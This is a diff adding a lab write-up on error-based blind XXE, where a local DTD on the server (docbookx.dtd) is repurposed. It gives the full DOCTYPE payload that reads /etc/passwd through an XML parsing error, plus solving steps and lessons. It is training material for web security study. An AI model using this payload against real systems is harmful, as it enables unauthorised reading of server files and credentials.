@@ -1,0 +1,23 @@
+
+# Lab: Exploiting XXE to Retrieve Data by Repurposing a Local DTD
+
+## How to Solve
+1. **Intercept the Request:** Click **Check stock** on any product page and send the `POST /product/stock` request to **Burp Repeater**.
+2. **Inject the Local DTD Payload:** Add the following `DOCTYPE` definition between the XML declaration and the `<stockCheck>` element:
+   ```xml
+   <!DOCTYPE message [
+   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+   <!ENTITY % ISOamso '
+   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+   &#x25;eval;
+   &#x25;error;
+   '>
+   %local_dtd;
+   ]>
+   ```
+3. **Exfiltrate Data:** Send the request. The server throws an XML parsing error containing the contents of `/etc/passwd`, solving the lab.
+
+## What I Learned
+* **Error-Based Blind XXE:** When an application does not return data in the response and blocks outbound connections, we can exfiltrate sensitive files through verbose XML parsing error messages.
+* **Repurposing Local DTDs:** XML restrictions block nested parameter entities inside an internal DTD, so we can load an existing local DTD file on the server (like `docbookx.dtd`) and redefine one of its entities to trigger an error containing file contents.
